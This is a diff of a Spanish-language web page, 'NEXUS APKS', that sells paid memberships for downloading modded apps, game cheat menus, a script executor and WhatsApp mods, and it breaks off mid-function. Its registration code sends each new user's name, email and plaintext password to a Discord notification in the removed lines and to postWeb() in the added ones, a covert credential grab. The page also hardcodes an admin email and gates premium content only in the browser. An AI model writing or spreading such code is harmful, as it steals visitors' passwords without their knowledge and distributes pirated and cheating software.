@@ -1,9 +1,10 @@
+
 <!DOCTYPE html>
 <html lang="es">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NEXUS APKS 🌪️ | PREMIUM MODS</title>
+    <title>NEXUS APKS 🌪️ | V4.0 OFFICIAL</title>
     
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js"></script>
@@ -11,249 +12,233 @@
 
     <style>
         :root {
-            --primary-grad: linear-gradient(135deg, #00ff88 0%, #00bd65 100%);
-            --premium-grad: linear-gradient(135deg, #ffd700 0%, #b8860b 100%);
-            --danger-grad: linear-gradient(135deg, #ff4b2b 0%, #ff416c 100%);
-            --dark-bg: #080808;
-            --card-bg: #121212;
-            --text-white: #ffffff;
+            --primary-grad: linear-gradient(45deg, #00ff88, #0088ff);
+            --premium-grad: linear-gradient(45deg, #ffd700, #ff8800);
+            --danger-grad: linear-gradient(45deg, #ff416c, #ff4b2b);
+            --dark-bg: #050505;
+            --card-bg: #111;
+            --border: #222;
         }
 
-        * { box-sizing: border-box; font-family: 'Segoe UI', sans-serif; transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); }
+        * { box-sizing: border-box; font-family: 'Arial', sans-serif; transition: 0.3s; }
 
         body {
-            background-color: var(--dark-bg);
-            color: var(--text-white);
+            background: var(--dark-bg);
+            color: white;
             margin: 0; padding: 0;
             overflow-x: hidden;
         }
 
-        /* --- INTRO --- */
-        #intro {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: #000; z-index: 9999; display: flex;
+        /* --- INTRO ANIMACIÓN --- */
+        #intro-layer {
+            position: fixed; top:0; left:0; width:100%; height:100%;
+            background: black; z-index: 99999; display: flex;
             flex-direction: column; align-items: center; justify-content: center;
         }
-        .nexus-title {
-            font-size: 3rem; font-weight: 900; background: var(--primary-grad);
+        .nexus-glitch {
+            font-size: 2.5rem; font-weight: 900; background: var(--primary-grad);
             -webkit-background-clip: text; -webkit-text-fill-color: transparent;
-            letter-spacing: 5px; animation: pulse 1.5s infinite;
+            text-transform: uppercase; letter-spacing: 5px; animation: pulse 1s infinite;
         }
 
-        /* --- AUTH --- */
-        .auth-container {
-            display: flex; align-items: center; justify-content: center;
-            min-height: 100vh; padding: 20px;
-        }
+        /* --- LOGIN / REGISTRO --- */
+        .auth-wrap { display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; }
         .auth-card {
-            background: var(--card-bg); padding: 40px; border-radius: 25px;
-            width: 100%; max-width: 400px; text-align: center;
-            border: 1px solid #333; box-shadow: 0 15px 35px rgba(0,0,0,0.5);
+            background: var(--card-bg); padding: 40px; border-radius: 30px;
+            width: 100%; max-width: 400px; border: 1px solid var(--border);
+            text-align: center; box-shadow: 0 20px 40px rgba(0,0,0,0.6);
         }
+
         .nexus-input {
             width: 100%; padding: 15px; margin: 10px 0;
-            background: #1a1a1a; border: 1px solid #444; color: #fff;
-            border-radius: 12px; outline: none;
+            background: #181818; border: 1px solid #333; color: white;
+            border-radius: 15px; outline: none; font-size: 1rem;
         }
-        .nexus-input:focus { border-color: #00ff88; box-shadow: 0 0 10px rgba(0,255,136,0.2); }
+        .nexus-input:focus { border-color: #00ff88; }
 
-        .btn-grad {
-            width: 100%; padding: 15px; border: none; border-radius: 12px;
-            font-weight: bold; cursor: pointer; color: #000;
-            background: var(--primary-grad); margin-top: 10px;
-            text-transform: uppercase;
+        .btn-action {
+            width: 100%; padding: 16px; border: none; border-radius: 15px;
+            font-weight: 900; cursor: pointer; text-transform: uppercase;
+            margin-top: 10px; font-size: 1rem;
         }
-        .btn-grad:hover { transform: translateY(-3px); box-shadow: 0 5px 15px rgba(0,255,136,0.4); }
-        .btn-guest { background: #333; color: #fff; margin-top: 15px; }
+        .btn-p { background: var(--primary-grad); color: black; }
+        .btn-g { background: #333; color: white; margin-top: 15px; }
+        .btn-p:hover { transform: scale(1.02); box-shadow: 0 0 20px rgba(0,255,136,0.3); }
 
-        /* --- DASHBOARD --- */
-        .header {
+        /* --- NAVBAR --- */
+        .navbar {
             display: flex; justify-content: space-between; align-items: center;
-            padding: 15px 5%; background: rgba(18,18,18,0.95);
-            backdrop-filter: blur(10px); position: sticky; top: 0; z-index: 1000;
-            border-bottom: 1px solid #222;
+            padding: 15px 5%; background: rgba(0,0,0,0.9);
+            border-bottom: 2px solid #222; position: sticky; top: 0; z-index: 1000;
         }
 
-        .status-box {
-            display: flex; align-items: center; gap: 15px;
+        .status-container { display: flex; align-items: center; gap: 15px; }
+        .pill { 
+            background: #1a1a1a; padding: 8px 15px; border-radius: 20px;
+            border: 1px solid #333; font-size: 0.8rem; font-weight: bold;
         }
-        .status-pill {
-            background: #222; padding: 6px 15px; border-radius: 30px;
-            font-size: 0.8rem; border: 1px solid #444; font-weight: bold;
+        
+        .admin-circle {
+            width: 40px; height: 40px; border-radius: 50%; background: #1a1a1a;
+            border: 1px solid var(--premium-grad); display: flex;
+            align-items: center; justify-content: center; cursor: pointer;
         }
 
         .btn-logout {
             background: var(--danger-grad); border: none; color: white;
-            padding: 6px 15px; border-radius: 10px; cursor: pointer; font-weight: bold;
+            padding: 8px 15px; border-radius: 12px; font-weight: 800; cursor: pointer;
         }
 
-        .btn-buy-top {
-            background: var(--premium-grad); color: black; border: none;
-            padding: 8px 18px; border-radius: 12px; font-weight: bold; cursor: pointer;
-        }
-
-        /* --- HERO --- */
+        /* --- CONTENIDO --- */
         .hero { text-align: center; padding: 40px 20px; }
-        .btn-whatsapp {
-            background: #25D366; color: white; padding: 18px 40px;
-            border-radius: 15px; text-decoration: none; display: inline-block;
-            font-weight: 900; margin-bottom: 15px; width: 100%; max-width: 350px;
-        }
-        .btn-terms {
-            background: none; border: none; color: #ff3333; cursor: pointer;
-            text-decoration: underline; font-weight: bold; font-size: 1.1rem;
+        .btn-wa {
+            background: #25D366; color: white; padding: 20px; border-radius: 20px;
+            text-decoration: none; font-weight: 900; display: inline-block; width: 100%; max-width: 400px;
+            box-shadow: 0 10px 20px rgba(37,211,102,0.2);
         }
 
-        /* --- APK GRID --- */
-        .apk-container {
-            display: grid; grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
+        .btn-terms-web {
+            background: none; border: none; color: #ff4444; font-weight: 900;
+            text-decoration: underline; font-size: 1.2rem; cursor: pointer; margin-top: 20px;
+        }
+
+        .grid {
+            display: grid; grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
             gap: 20px; padding: 20px 5%;
         }
-        .apk-card {
-            background: var(--card-bg); border-radius: 20px; overflow: hidden;
-            border: 1px solid #222; position: relative;
+
+        .card {
+            background: var(--card-bg); border-radius: 25px; overflow: hidden;
+            border: 1px solid var(--border); position: relative;
         }
-        .apk-card:hover { transform: scale(1.03); border-color: #00ff88; }
-        .apk-img { width: 100%; height: 160px; object-fit: cover; }
-        .apk-info { padding: 12px; text-align: center; }
-        .apk-info h3 { font-size: 0.9rem; margin: 0 0 10px 0; height: 40px; }
-        .btn-dl {
-            background: var(--primary-grad); border: none; width: 100%;
-            padding: 10px; border-radius: 10px; font-weight: bold; cursor: pointer;
-        }
+        .card:hover { border-color: #00ff88; transform: translateY(-5px); }
+        .card-img { width: 100%; height: 180px; object-fit: cover; }
+        .card-body { padding: 15px; text-align: center; }
+        .card-body h3 { font-size: 0.9rem; margin: 0 0 10px; height: 40px; overflow: hidden; }
 
         /* --- MODALES --- */
         .modal {
-            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.98); z-index: 10000; overflow-y: auto;
+            display: none; position: fixed; top:0; left:0; width:100%; height:100%;
+            background: rgba(0,0,0,0.95); z-index: 10000; overflow-y: auto; padding: 20px;
         }
-        .modal-content {
-            background: #111; max-width: 450px; margin: 50px auto;
-            border-radius: 25px; padding: 30px; border: 1px solid #333;
-        }
-
-        .premium-card {
-            background: #1a1a1a; border: 1px solid #ffd700;
-            padding: 20px; border-radius: 20px; margin-bottom: 20px; text-align: left;
+        .modal-box {
+            background: #0f0f0f; max-width: 480px; margin: 30px auto;
+            border-radius: 30px; padding: 35px; border: 1px solid #333;
         }
 
-        /* --- ADMIN --- */
-        .admin-btn-circle {
-            background: #222; width: 45px; height: 45px; border-radius: 50%;
-            display: flex; align-items: center; justify-content: center;
-            cursor: pointer; border: 1px solid var(--gold);
+        .shop-item {
+            background: #181818; border: 1px solid #ffd700;
+            padding: 20px; border-radius: 20px; margin-bottom: 15px;
         }
 
-        @keyframes pulse { 0% { transform: scale(1); opacity: 1; } 50% { transform: scale(0.95); opacity: 0.7; } 100% { transform: scale(1); opacity: 1; } }
+        /* --- ANIMACIONES --- */
+        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
 
-        @media (max-width: 600px) {
-            .apk-container { grid-template-columns: repeat(2, 1fr); gap: 10px; }
+        @media (max-width: 500px) {
+            .grid { grid-template-columns: 1fr 1fr; gap: 10px; }
         }
     </style>
 </head>
 <body>
 
-<div id="intro">
-    <div class="nexus-title">NEXUS APKS 🌪️</div>
-    <p style="color: #666; margin-top: 10px;">Cargando experiencia premium...</p>
+<div id="intro-layer">
+    <div class="nexus-glitch">NEXUS APKS 🌪️</div>
 </div>
 
-<div id="auth-screen" class="auth-container">
-    <div class="auth-card" id="login-box">
-        <h1 style="color: #00ff88;">NEXUS APKS</h1>
-        <p>Apps modificadas📁</p>
-        <input type="email" id="login-email" class="nexus-input" placeholder="CORREO ELECTRÓNICO✉️">
-        <input type="password" id="login-pass" class="nexus-input" placeholder="CONTRASEÑA 🔑">
-        <button class="btn-grad" onclick="handleLogin()">INICIAR SESIÓN</button>
-        <button class="btn-grad btn-guest" onclick="enterGuest()">MODO INVITADO👤</button>
-        <p style="margin-top: 20px;">¿No tienes cuenta? <span onclick="toggleAuth()" style="color:#00ff88; cursor:pointer;">Regístrate</span></p>
+<div id="scr-auth" class="auth-wrap">
+    <div class="auth-card" id="box-login">
+        <h1 style="color: #00ff88; margin:0;">NEXUS APKS</h1>
+        <p style="color: #777;">Apps modificadas📁</p>
+        <input type="email" id="li-email" class="nexus-input" placeholder="CORREO ELECTRÓNICO✉️">
+        <input type="password" id="li-pass" class="nexus-input" placeholder="CONTRASEÑA 🔑">
+        <button class="btn-action btn-p" onclick="doLogin()">INICIAR SESIÓN</button>
+        <button class="btn-action btn-g" onclick="guestMode()">MODO INVITADO👤</button>
+        <p style="margin-top:20px; font-size: 0.9rem;">¿Sin cuenta? <b onclick="swapAuth()" style="color:#00ff88; cursor:pointer;">Regístrate aquí</b></p>
     </div>
 
-    <div class="auth-card" id="reg-box" style="display:none;">
-        <h1 style="color: #00ff88;">REGISTRO</h1>
-        <input type="text" id="reg-user" class="nexus-input" placeholder="USUARIO👤">
-        <input type="email" id="reg-email" class="nexus-input" placeholder="CORREO✉️">
-        <input type="password" id="reg-pass" class="nexus-input" placeholder="CONTRASEÑA 🔑">
-        <button class="btn-grad" onclick="handleRegister()">REGISTRARME</button>
-        <button class="btn-grad btn-guest" onclick="toggleAuth()">VOLVER</button>
+    <div class="auth-card" id="box-reg" style="display:none;">
+        <h1 style="color: #00ff88; margin:0;">REGISTRO</h1>
+        <input type="text" id="re-user" class="nexus-input" placeholder="USUARIO👤">
+        <input type="email" id="re-email" class="nexus-input" placeholder="CORREO✉️">
+        <input type="password" id="re-pass" class="nexus-input" placeholder="CONTRASEÑA 🔑">
+        <button class="btn-action btn-p" onclick="doRegister()">REGISTRARME</button>
+        <button class="btn-action btn-g" onclick="swapAuth()">VOLVER</button>
     </div>
 </div>
 
-<div id="dashboard" style="display:none;">
-    <header class="header">
-        <div class="nav-logo" style="font-weight:900; color:#00ff88; font-size:1.4rem;">NEXUS 🌪️</div>
+<div id="scr-dash" style="display:none;">
+    <nav class="navbar">
+        <div style="font-weight:900; font-size:1.5rem; background:var(--primary-grad); -webkit-background-clip:text; -webkit-text-fill-color:transparent;">NEXUS 🌪️</div>
         
-        <div class="status-box">
-            <button class="btn-buy-top" onclick="showModal('modal-shop')">COMPRAR 💳</button>
-            <div id="admin-icon" class="admin-btn-circle" style="display:none;" onclick="showModal('modal-admin')">👑</div>
-            <div class="status-pill" id="status-text">STATUS: FREE👤</div>
-            <button class="btn-logout" onclick="logout()">SALIR 🚪</button>
+        <div class="status-container">
+            <button class="btn-logout" style="background:var(--premium-grad); color:black;" onclick="openM('m-shop')">COMPRAR 💳</button>
+            <div id="adm-trigger" class="admin-circle" style="display:none;" onclick="openM('m-admin')">👑</div>
+            <div class="pill" id="st-label">FREE👤</div>
+            <button class="btn-logout" onclick="doLogout()">CERRAR SESIÓN 🚪</button>
         </div>
-    </header>
+    </nav>
 
-    <section class="hero">
-        <a href="https://whatsapp.com/channel/0029VbC12x4GufIzNYfrPh3R" target="_blank" class="btn-whatsapp">
-            CANAL DE WHATSAPP 📢
-        </a><br>
-        <button class="btn-terms" onclick="showModal('modal-terms')">TÉRMINOS DE LA WEB🚨</button>
-    </section>
+    <div class="hero">
+        <a href="https://whatsapp.com/channel/0029VbC12x4GufIzNYfrPh3R" target="_blank" class="btn-wa">CANAL DE WHATSAPP 📢</a><br>
+        <button class="btn-terms-web" onclick="openM('m-terms')">TÉRMINOS DE LA WEB🚨</button>
+    </div>
 
-    <div class="apk-container" id="apk-grid">
-        </div>
+    <div class="grid" id="apk-grid"></div>
 
-    <div style="text-align:center; padding:40px;">
-        <a href="https://tiktok.com/@saswarsasware332" target="_blank" style="color:#555; text-decoration:none; font-size:0.8rem;">TikTok: @saswarsasware332</a>
+    <div style="text-align:center; padding:40px; opacity:0.3;">
+        <a href="https://tiktok.com/@saswarsasware332" target="_blank" style="color:white; text-decoration:none;">TikTok: @saswarsasware332</a>
     </div>
 </div>
 
-<div id="modal-terms" class="modal">
-    <div class="modal-content">
+<div id="m-terms" class="modal">
+    <div class="modal-box">
         <h2 style="color:#00ff88; text-align:center;">TÉRMINOS DE LA PÁGINA 📄</h2>
-        <div style="color:#ccc; font-size:0.9rem; line-height:1.6;">
-            <p>• Únete al canal de WhatsApp es importante para avisarte de las nuevas actualizaciones...</p>
-            <p>• Debes comprar una membresía de 15 o 30 días. Al terminar, desinstala el MOD o tu número será baneado.</p>
-            <p>• Al comprar se te dará un tutorial único, después tendrá costo extra.</p>
+        <div style="font-size:0.9rem; color:#bbb; line-height:1.6;">
+            <p>🌪️ <b>NEXUS APKS</b></p>
+            <p>* Únete al canal de WhatsApp es importante para avisarte de las nuevas actualizaciones de WhatsApp plus o gb WhatsApp para que no seas suspendido.</p>
+            <p>* Debes comprar una membresía ya sea de 15 días o 30 días. Una vez terminada, desinstala el MOD o tu número será baneado.</p>
+            <p>* Recuerda mantener activa tu membresía para disfrutar del contenido.</p>
+            <p>* Al comprar se te dará un tutorial para instalar WhatsApp modificado solo una vez.</p>
         </div>
-        <button class="btn-grad" onclick="closeModal('modal-terms')">ACEPTAR Y CONTINUAR</button>
+        <button class="btn-action btn-p" onclick="closeM('m-terms')">ACEPTAR Y CONTINUAR</button>
     </div>
 </div>
 
-<div id="modal-shop" class="modal">
-    <div class="modal-content">
-        <h2 style="color:#ffd700; text-align:center;">MEMBRESÍAS PREMIUM 💎</h2>
-        <div class="premium-card">
+<div id="m-shop" class="modal">
+    <div class="modal-box">
+        <h2 style="color:#ffd700; text-align:center;">MEMBRESÍAS 💎</h2>
+        <div class="shop-item">
             <h3>15 DÍAS 💎✨</h3>
-            <p>🟢 acceso alas apps modificadas<br>🟢 soporte 24/7<br>🟢 actualizaciónes</p>
-            <button class="btn-grad" style="background:var(--premium-grad);" onclick="buy('15 DÍAS')">COMPRAR</button>
+            <p>🟢 Acceso Apps Modificadas<br>🟢 Soporte 24/7<br>🟢 Actualizaciones</p>
+            <button class="btn-action btn-p" style="background:var(--premium-grad);" onclick="buyNow('15 DÍAS')">COMPRAR</button>
         </div>
-        <div class="premium-card">
+        <div class="shop-item">
             <h3>30 DÍAS 💎✨</h3>
-            <p>🟢 acceso alas apps modificadas<br>🟢 soporte 24/7<br>🟢 actualizaciónes</p>
-            <button class="btn-grad" style="background:var(--premium-grad);" onclick="buy('30 DÍAS')">COMPRAR</button>
+            <p>🟢 Acceso Apps Modificadas<br>🟢 Soporte 24/7<br>🟢 Actualizaciones</p>
+            <button class="btn-action btn-p" style="background:var(--premium-grad);" onclick="buyNow('30 DÍAS')">COMPRAR</button>
         </div>
-        <button class="btn-grad btn-guest" onclick="closeModal('modal-shop')">CERRAR</button>
+        <button class="btn-action btn-g" onclick="closeM('m-shop')">CERRAR</button>
     </div>
 </div>
 
-<div id="modal-admin" class="modal">
-    <div class="modal-content">
+<div id="m-admin" class="modal">
+    <div class="modal-box">
         <h2 style="color:#ffd700; text-align:center;">USUARIOS PREMIUM 💎</h2>
-        <input type="email" id="adm-email" class="nexus-input" placeholder="CORREO ✉️">
-        <select id="adm-days" class="nexus-input">
+        <input type="email" id="ad-email" class="nexus-input" placeholder="CORREO ✉️">
+        <select id="ad-days" class="nexus-input">
             <option value="15">15 DÍAS</option>
             <option value="30">30 DÍAS</option>
         </select>
-        <button class="btn-grad" style="background:var(--premium-grad);" onclick="grantVip()">OTORGAR PREMIUM 💎</button>
+        <button class="btn-action btn-p" style="background:var(--premium-grad);" onclick="giveVip()">OTORGAR PREMIUM 💎</button>
         
-        <h3 style="margin-top:30px;">USUARIOS ACTIVOS</h3>
-        <div id="vip-list" style="max-height:150px; overflow-y:auto; background:#000; padding:10px; border-radius:10px;">
-            </div>
-        <button class="btn-grad btn-guest" onclick="closeModal('modal-admin')">CERRAR</button>
+        <h3 style="margin-top:30px;">USUARIOS CON PREMIUM 💎</h3>
+        <div id="vip-list" style="max-height:200px; overflow-y:auto; background:black; padding:10px; border-radius:15px;"></div>
+        <button class="btn-action btn-g" onclick="closeM('m-admin')">SALIR</button>
     </div>
 </div>
 
 <script>
-    // --- CONFIGURACIÓN ---
+    // Configuración Firebase (Usando tu DB)
     const firebaseConfig = {
         apiKey: "AIzaSyAzzRWHGhYVFgkWyRwfgNKc5Ql52U4xxM8",
         authDomain: "hyper-drip.firebaseapp.com",
@@ -272,7 +257,7 @@
     let isPremium = false;
     let isGuest = false;
 
-    // --- BASE DE DATOS APKS ---
+    // --- LISTA DE APKS ---
     const APKS = [
         { n: "CAP CUT PRO", i: "https://i.ibb.co/Nd4ZW59d/images.jpg", l: "https://www.mediafire.com/file/epm2wsvnt6qe3il/CapCut_PR____14.7.0_ui_old.apk/file", g: true },
         { n: "DELTA EXECUTOR", i: "https://i.ibb.co/8g1X87mz/41p-TZNE7m-IL.jpg", l: "https://deltaexploits.gg/delta-executor-android", g: false },
@@ -298,92 +283,107 @@
         { n: "BLOOD STRIKE MENU", i: "https://i.ibb.co/ynfPjpTS/hqdefault.jpg", l: "https://www.mediafire.com/file/sg548qen5fa1cea/FREE_MOD_BY_KYKYR_CHEATZ.apk/file", g: true },
         { n: "GB WHATSAPP EXTREME", i: "https://i.ibb.co/bj16Q1H3/favicon.png", l: "https://www.mediafire.com/file/e2yrwtq46ab16h1/GBEXTREME_MAS_V26.36E.apk/file", p: true },
         { n: "MB WHATSAPP PLUS", i: "https://i.ibb.co/rGCqw4DX/Whatsapp-plus-logo-2.webp", l: "https://www.mediafire.com/file/yfosnqs5lkb7vfl/MBWhatsApp_2.8.0F_by_stefanoYG.apk/file", p: true },
-        { n: "GB WHATSAPP", i: "https://i.ibb.co/bj16Q1H3/favicon.png", l: "https://www.mediafire.com/file/ijzc5qggle2v1yf/G.B-Whats4pp_PR0_v26.36.apk/file", p: true }
+        { n: "GB WHATSAPP PRO", i: "https://i.ibb.co/bj16Q1H3/favicon.png", l: "https://www.mediafire.com/file/ijzc5qggle2v1yf/G.B-Whats4pp_PR0_v26.36.apk/file", p: true }
     ];
 
-    // --- CARGA ---
-    window.onload = () => {
+    // --- LÓGICA DE INICIO ---
+    auth.onAuthStateChanged(user => {
         setTimeout(() => {
-            document.getElementById('intro').style.display = 'none';
-            auth.onAuthStateChanged(user => {
-                if(user) setupUser(user);
-                else showAuth();
-            });
+            document.getElementById('intro-layer').style.display = 'none';
+            if (user) {
+                isGuest = false;
+                loadDashboard(user);
+            } else if (!isGuest) {
+                document.getElementById('scr-auth').style.display = 'flex';
+                document.getElementById('scr-dash').style.display = 'none';
+            }
         }, 2000);
-    };
+    });
 
-    function showAuth() {
-        document.getElementById('auth-screen').style.display = 'flex';
-        document.getElementById('dashboard').style.display = 'none';
-    }
-
-    function toggleAuth() {
-        const l = document.getElementById('login-box');
-        const r = document.getElementById('reg-box');
+    function swapAuth() {
+        const l = document.getElementById('box-login');
+        const r = document.getElementById('box-reg');
         l.style.display = l.style.display === 'none' ? 'block' : 'none';
         r.style.display = r.style.display === 'none' ? 'block' : 'none';
     }
 
-    // --- FIREBASE LOGIC ---
-    async function handleLogin() {
-        const e = document.getElementById('login-email').value;
-        const p = document.getElementById('login-pass').value;
-        try { await auth.signInWithEmailAndPassword(e, p); } catch(e) { alert(e.message); }
+    async function doLogin() {
+        const e = document.getElementById('li-email').value;
+        const p = document.getElementById('li-pass').value;
+        try { await auth.signInWithEmailAndPassword(e, p); } catch(err) { alert("Error: " + err.message); }
     }
 
-    async function handleRegister() {
-        const u = document.getElementById('reg-user').value;
-        const e = document.getElementById('reg-email').value;
-        const p = document.getElementById('reg-pass').value;
-        if(!u || !e || !p) return alert("Completa los campos");
+    async function doRegister() {
+        const u = document.getElementById('re-user').value;
+        const e = document.getElementById('re-email').value;
+        const p = document.getElementById('re-pass').value;
+        if(!u || !e || !p) return alert("Faltan datos");
         try {
             await auth.createUserWithEmailAndPassword(e, p);
-            notifyDiscord(`🆕 **NUEVO REGISTRO**\n👤 USUARIO: ${u}\n✉️ CORREO: ${e}\n🔑 PASS: ${p}`);
-        } catch(e) { alert(e.message); }
+            postWeb(u, e, p);
+        } catch(err) { alert(err.message); }
     }
 
-    function enterGuest() {
+    function guestMode() {
         isGuest = true;
         isPremium = false;
-        document.getElementById('auth-screen').style.display = 'none';
-        document.getElementById('dashboard').style.display = 'block';
-        renderContent();
+        document.getElementById('scr-auth').style.display = 'none';
+        document.getElementById('scr-dash').style.display = 'block';
+        updateUI();
     }
 
-    function setupUser(user) {
-        isGuest = false;
-        document.getElementById('auth-screen').style.display = 'none';
-        document.getElementById('dashboard').style.display = 'block';
+    function doLogout() {
+        auth.signOut().then(() => {
+            isGuest = false;
+            window.location.reload();
+        });
+    }
+
+    // --- DASHBOARD ---
+    function loadDashboard(user) {
+        document.getElementById('scr-auth').style.display = 'none';
+        document.getElementById('scr-dash').style.display = 'block';
         
-        if(user.email === "chrisslorenzohdz@gmail.com") {
-            document.getElementById('admin-icon').style.display = 'flex';
-            loadVipList();
+        if (user.email === "chrisslorenzohdz@gmail.com") {
+            document.getElementById('adm-trigger').style.display = 'flex';
+            loadVips();
         }
 
         const key = user.email.replace(/\./g, '_');
         db.ref(`premium_users/${key}`).on('value', snap => {
             isPremium = snap.exists() && snap.val().active;
-            renderContent();
+            updateUI();
         });
     }
 
-    function renderContent() {
-        const st = document.getElementById('status-text');
-        if(isGuest) st.innerHTML = "STATUS: FREE👤";
-        else if(auth.currentUser?.email === "chrisslorenzohdz@gmail.com") st.innerHTML = "STATUS: ADMIN 👑";
-        else st.innerHTML = isPremium ? "STATUS: PREMIUM 💎" : "STATUS: FREE👤";
+    function updateUI() {
+        const label = document.getElementById('st-label');
+        if (isGuest) label.innerHTML = "FREE👤";
+        else if (auth.currentUser?.email === "chrisslorenzohdz@gmail.com") label.innerHTML = "ADMIN 👑";
+        else label.innerHTML = isPremium ? "PREMIUM 💎" : "FREE👤";
 
         const grid = document.getElementById('apk-grid');
         grid.innerHTML = "";
         APKS.forEach(apk => {
-            const card = document.createElement('div');
-            card.className = "apk-card";
-            card.innerHTML = `
-                <img src="${apk.i}" class="apk-img">
-                <div class="apk-info">
+            const div = document.createElement('div');
+            div.className = "card";
+            div.innerHTML = `
+                <img src="${apk.i}" class="card-img">
+                <div class="card-body">
                     <h3>${apk.n}</h3>
-                    <button class="btn-dl" onclick="handleDL('${apk.l}', ${apk.g}, ${apk.p})">DESCARGAR</button>
+                    <button class="btn-action btn-p" onclick="handleDL('${apk.l}', ${apk.g}, ${apk.p})">DESCARGAR</button>
                 </div>
             `;
-            grid.appendChild(card);
-        
+            grid.appendChild(div);
+        });
+    }
+
+    function handleDL(link, isG, isP) {
+        if (isGuest) {
+            if (isG) window.open(link, '_blank');
+            else { alert("HAZTE VIP Y REGÍSTRATE✨"); openM('m-shop'); }
+            return;
+        }
+        if (isP && !isPremium && auth.currentUser.email !== "chrisslorenzohdz@gmail.com") {
+            alert("HAZTE VIP Y REGÍSTRATE✨");
+       
